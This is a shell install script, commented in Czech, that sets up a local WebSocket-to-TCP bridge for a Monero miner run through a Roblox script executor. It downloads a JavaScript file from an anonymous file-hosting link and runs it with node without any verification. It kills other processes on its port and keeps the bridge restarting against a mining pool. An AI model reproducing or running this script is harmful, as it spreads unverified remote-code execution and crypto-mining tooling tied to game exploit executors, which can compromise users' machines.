#!/bin/sh
# RandomX bridge pro Roblox miner — stahne a spusti lokalni WS->TCP most.
# macOS: dvojklik na install.command (nebo `sh install.sh`). Linux: `sh install.sh`.
set -u

BRIDGE_URL="${BRIDGE_URL:-https://files.catbox.moe/ljxehk.js}"
POOL="${POOL:-gulf.moneroocean.stream:10128}"
DIR="${HOME:-/tmp}/.rx-bridge"
PORT="${PORT:-8790}"

if ! command -v node >/dev/null 2>&1; then
	echo "Chybi Node.js. Nainstaluj LTS z https://nodejs.org/ a spust znovu."
	echo
	printf "Enter pro zavreni…"; read -r _
	exit 1
fi

mkdir -p "$DIR"
echo "Stahuji bridge do $DIR …"
if ! curl -fsSL "$BRIDGE_URL" -o "$DIR/stratum-bridge.js"; then
	echo "Stazeni bridge selhalo."
	printf "Enter pro zavreni…"; read -r _
	exit 1
fi

# predchozi instance (i z jineho okna) pryc, at na portu nejsou dva posluchaci
pkill -f "stratum-bridge.js" 2>/dev/null
sleep 1
if command -v lsof >/dev/null 2>&1; then
	pids=$(lsof -ti "tcp:$PORT" 2>/dev/null)
	[ -n "$pids" ] && kill $pids 2>/dev/null && sleep 1
fi

echo "Bridge bezi na ws://127.0.0.1:$PORT (pool $POOL)."
echo "Vloz do executoru miner — tohle okno nech otevrene. Ctrl+C ukonci."
echo

while :; do
	node "$DIR/stratum-bridge.js" --port "$PORT" --bind 127.0.0.1 --pool "$POOL"
	echo "bridge spadl, restartuji za 3 s…"
	sleep 3
done
